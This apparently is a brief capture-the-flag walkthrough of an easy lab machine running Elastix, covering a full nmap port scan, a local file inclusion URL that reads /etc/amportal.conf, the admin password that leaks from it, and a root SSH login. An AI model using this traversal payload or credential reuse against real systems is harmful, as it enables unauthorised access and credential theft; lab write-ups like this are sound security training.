Level: Easy

1. Port Enumeration

I started with a full port scan:

sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.10.10.7
  • -p- --open: Scans all ports and shows only open ones.
  • -sS: Stealth SYN scan.
  • -vvv: Maximum verbosity.

I found a large number of open ports:

  • 22 (SSH), 25 (SMTP), 80 (HTTP), 110 (POP3), 111 (RPC)
  • 143 (IMAP), 443 (HTTPS), 993 (sIMAP), 995 (pop3d)
  • 3306 (MySQL), 4445 (upnotifyp), 10000 (Webmin)

2. Exploitation

Navigating to port 443, I found Elastix. Researching the version revealed a Local File Inclusion (LFI) vulnerability:

https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

This leaked the admin credentials:

Credentials admin:jEhdIekWmdjE

Since the SSH version was quite old, I had to use specific algorithms to connect:

ssh -oHostKeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group14-sha1 root@10.10.10.7
